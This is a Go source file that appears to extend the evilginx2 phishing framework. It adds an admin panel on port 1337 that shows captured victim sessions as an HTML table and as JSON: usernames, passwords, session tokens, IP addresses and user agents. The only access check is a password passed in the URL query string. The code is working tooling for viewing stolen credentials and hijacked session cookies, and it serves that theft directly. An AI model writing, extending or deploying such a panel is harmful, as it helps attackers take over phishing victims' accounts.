package core

import (
	"encoding/json"
	"fmt"
	"html/template"
	"math/rand"
	"net/http"
	"path/filepath"
	"time"

	"github.com/fatih/color"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type BaseTemplateData struct {
	PageTitle string
	Sessions  []DisplaySession
	Admin_path string
}

// Data strucutre : key-value pair for Bunt DB
type DisplaySession struct {
	ID          int    `json:"id"`
	Phishlet    string `json:"phishlet"`
	Username    string `json:"username"`
	Password    string `json:"password"`
	Tokens      string `json:"tokens"`
	Remote_addr string `json:"remote_addr"`
	Useragent   string `json:"useragent"`
	Update_time string `json:"update_time"`
}

// APIResponse structure : send data to UI
type APIResponse struct {
	Body string `json:"body"`
}

// Database pointer
var (
	admin_db  *database.Database
	admin_cfg *Config
	cfg_path  string
	pwd_str string
)

func init() {
    rand.Seed(time.Now().UnixNano())
}

func NewAdmin(db *database.Database, cfg *Config, path string) {
	admin_db = db
	admin_cfg = cfg
	cfg_path = path
	pwd_str = cfg.adminpage_path
	if len(pwd_str) == 0 {
		pwd_str = GenRandomToken()[:8]
	}

	http.HandleFunc("/listSessions", makeTable)
	http.HandleFunc("/listAll", makeJSON)
	log.Info(color.RedString("Admin panel") + " started at %s", color.HiWhiteString("http://%s:1337/listSessions?pwd=%s", cfg.serverIP, pwd_str))
	go func() {
		if err := http.ListenAndServe(":1337", nil); err != nil {
			log.Fatal("Failed to start admin panel on port 1337")
		}
	}()
}

func makeJSON(w http.ResponseWriter, r *http.Request) {
	pwd := r.URL.Query().Get("pwd")
	if pwd != pwd_str {
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	jsonResp, err := json.Marshal(getAllData())
	if err != nil {
		log.Error("Error happened in JSON marshal. Err: %s", err)
		w.WriteHeader(http.StatusInternalServerError)
		resp := make(map[string]string)
		resp["message"] = fmt.Sprintf("Error happened in JSON marshal: %s", err)
	}
	w.WriteHeader(http.StatusCreated)
	w.Write(jsonResp)
}

func makeTable(w http.ResponseWriter, r *http.Request) {
	pwd := r.URL.Query().Get("pwd")
	if pwd != pwd_str {
		return
	}

	tmpl := template.Must(template.ParseFiles(filepath.Join(cfg_path, "table.html")))
	data := BaseTemplateData{
		PageTitle: "SESSIONS",
		Admin_path: pwd_str,
	}
	tmpl.Execute(w, data)
}

func getAllData() []DisplaySession {
	db := admin_db
	sessions, err := db.ListSessions()
	if err != nil {
		log.Error("listsessions: %v", err)
	}
	var displaySessions []DisplaySession
	for i := 0; i < len(sessions); i++ {
		sess := sessions[i]
		pl := getPhishlet(sess.Phishlet)
		tokns := TokensToJSON(pl, sess.Tokens)
		displaySessions = append(displaySessions, DisplaySession{
			ID:          sess.Id,
			Phishlet:    sess.Phishlet,
			Username:    sess.Username,
			Password:    sess.Password,
			Tokens:      tokns,
			Remote_addr: sess.RemoteAddr,
			Useragent:   sess.UserAgent,
			Update_time: time.Unix(sess.UpdateTime, 0).Format(time.RFC822),
		})
	}
	return displaySessions
}

func getPhishlet(name string) *Phishlet {
	for site, pl := range admin_cfg.phishlets {
		if site == name {
			return pl
		}
	}
	return nil
}
